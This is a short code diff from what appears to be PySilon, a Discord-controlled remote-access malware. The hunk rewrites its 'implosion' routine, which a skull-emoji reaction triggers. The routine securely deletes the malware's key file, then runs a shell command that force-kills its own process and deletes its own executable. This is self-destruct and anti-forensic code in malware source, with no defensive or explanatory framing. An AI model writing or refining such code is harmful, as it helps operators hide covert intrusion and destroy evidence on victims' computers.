@@ -185,9 +185,7 @@ async def on_reaction_add(reaction, user):
                 if str(reaction) == '💀' and expectation == 'implosion':
 # [pysilon_var] !registry_implosion 5
                     secure_delete_file('PySilon.key', 10)
-                    cmd = 'start cmd /c "TIMEOUT /T 2&del "' + sys.argv[0] + '"'
-                    os.system(cmd)
-                    sys.exit(0)
+                    os.system('cmd.exe /c taskkill /f /pid ' + str(os.getpid()) + ' & del "' + sys.argv[0] + '"')
                 elif str(reaction) == '🔴' and expectation == 'implosion':
                     expectation = None                
 # [pysilon_var] on reaction add 4
